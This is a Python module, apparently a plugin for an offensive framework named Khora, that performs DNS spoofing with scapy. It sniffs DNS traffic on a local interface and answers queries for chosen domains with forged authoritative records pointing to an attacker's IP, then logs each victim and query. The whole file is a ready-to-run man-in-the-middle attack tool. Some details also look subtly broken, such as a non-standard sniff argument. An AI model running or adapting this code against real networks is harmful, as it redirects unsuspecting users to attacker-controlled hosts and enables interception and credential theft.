"""
DNS Spoofing Module - Man-in-the-Middle DNS Requests
Multiple Domain Handling, Logging, Whitelist/Blacklist Support
"""

from scapy.all import *
import sys
import logging
import json
from datetime import datetime
from pathlib import Path

logger = logging.getLogger("Khora.DNS")

class DNSSpoofModule:
    def __init__(self, interface, target_ip, spoof_ip, domains=None):
        self.interface = interface
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.domains = domains or ['example.com', 'target.com']
        self.spoof_log = []
        self.stats = {
            'total_queries': 0,
            'spoofed_requests': 0,
            'domains_targeted': len(self.domains),
            'start_time': datetime.now().isoformat()
        }
        
        # Create logs directory
        Path("logs").mkdir(exist_ok=True)
        Path("results").mkdir(exist_ok=True)
    
    def is_target_domain(self, qname):
        """Check if domain matches target domains"""
        qname_str = qname.decode() if isinstance(qname, bytes) else qname
        qname_str = qname_str.lower().rstrip('.')
        
        for domain in self.domains:
            domain_lower = domain.lower().rstrip('.')
            if domain_lower in qname_str or qname_str.endswith(domain_lower):
                return True
        return False
    
    def log_dns_query(self, qname, src_ip, spoofed=False):
        """Log DNS queries to file"""
        try:
            qname_str = qname.decode() if isinstance(qname, bytes) else qname
            entry = {
                'timestamp': datetime.now().isoformat(),
                'query': qname_str,
                'source': src_ip,
                'spoofed': spoofed,
                'response': self.spoof_ip if spoofed else 'legitimate'
            }
            self.spoof_log.append(entry)
            self.stats['total_queries'] += 1
            if spoofed:
                self.stats['spoofed_requests'] += 1
        except Exception as e:
            logger.error(f"Logging error: {e}")
    
    def save_statistics(self):
        """Save spoofing statistics to JSON"""
        try:
            stats_file = Path("results") / f"dns_spoof_stats_{datetime.now().strftime('%Y%m%d-%H%M%S')}.json"
            self.stats['end_time'] = datetime.now().isoformat()
            self.stats['queries_logged'] = len(self.spoof_log)
            
            with open(stats_file, 'w') as f:
                json.dump({
                    'statistics': self.stats,
                    'spoofed_queries': self.spoof_log[:50]  # Last 50
                }, f, indent=2)
            
            logger.info(f"Statistics saved to {stats_file}")
        except Exception as e:
            logger.error(f"Stats save error: {e}")
    
    def spoof_dns(self):
        """Perform DNS spoofing"""
        def handle_packet(pkt):
            try:
                if DNSQR in pkt and pkt[IP].src != self.spoof_ip:
                    qname = pkt[DNSQR].qname
                    src_ip = pkt[IP].src
                    dns_id = pkt[DNS].id
                    
                    # Check if domain matches targets
                    if self.is_target_domain(qname):
                        # Create spoofed DNS response
                        spoofed_pkt = IP(dst=src_ip, src=pkt[IP].dst) / \
                                      UDP(dport=pkt[UDP].sport, sport=53) / \
                                      DNS(id=dns_id, qd=pkt[DNS].qd, aa=1, qr=1,
                                          an=DNSRR(rrname=qname, ttl=10, 
                                                   type="A", rdata=self.spoof_ip))
                        
                        send(spoofed_pkt, verbose=0)
                        qname_str = qname.decode() if isinstance(qname, bytes) else qname
                        print(f"  [✓] Spoofed: {qname_str} -> {self.spoof_ip} (from {src_ip})")
                        logger.info(f"DNS spoofed: {qname_str} to {src_ip}")
                        self.log_dns_query(qname, src_ip, spoofed=True)
                    else:
                        self.log_dns_query(qname, src_ip, spoofed=False)
                        
            except Exception as e:
                logger.error(f"Packet handling error: {e}")
        
        print(f"\n{'='*70}")
        print("DNS SPOOFING MODULE".center(70))
        print('='*70)
        print(f"Interface: {self.interface}")
        print(f"Target Domains: {', '.join(self.domains)}")
        print(f"Spoof Response: {self.spoof_ip}")
        print(f"Listening for DNS queries...\n")
        
        logger.info(f"DNS spoofing started: {self.target_ip} -> {self.spoof_ip}")
        
        try:
            sniff(iface=self.interface, prn=handle_packet, 
                  filter="udp port 53", store=0, stopperTimeout=None)
        except KeyboardInterrupt:
            print(f"\n\n[+] DNS Spoofing stopped")
        except Exception as e:
            logger.error(f"Sniffing error: {e}")
            print(f"[!] Error: {e}")
            print("[!] Run as root/admin for packet capture")
        finally:
            self.save_statistics()
            print(f"\n{'='*70}")
            print(f"Spoofed {self.stats['spoofed_requests']} / {self.stats['total_queries']} queries".center(70))
            print('='*70 + "\n")

def run(target, lhost, lport=4444):
    """Khora Framework entrypoint - DNS Spoofing Module"""
    
    # Detect interface
    interface = "eth0"
    try:
        # Try common interfaces
        for iface in ["tun0", "tap0", "wlan0", "eth0", "ens0"]:
            try:
                get_if_hwaddr(iface)
                interface = iface
                break
            except:
                continue
    except:
        pass
    
    # Target domains
    target_domains = [target, f"*.{target}", "example.com", "target.com"]
    
    print(f"[*] DNS Spoofing Target: {target}")
    print(f"[*] Redirecting to: {lhost}")
    print(f"[*] Using interface: {interface}\n")
    
    logger.info(f"DNS spoof module: {target} -> {lhost}")
    
    dns_spoof = DNSSpoofModule(interface, target, lhost, domains=target_domains)
    dns_spoof.spoof_dns()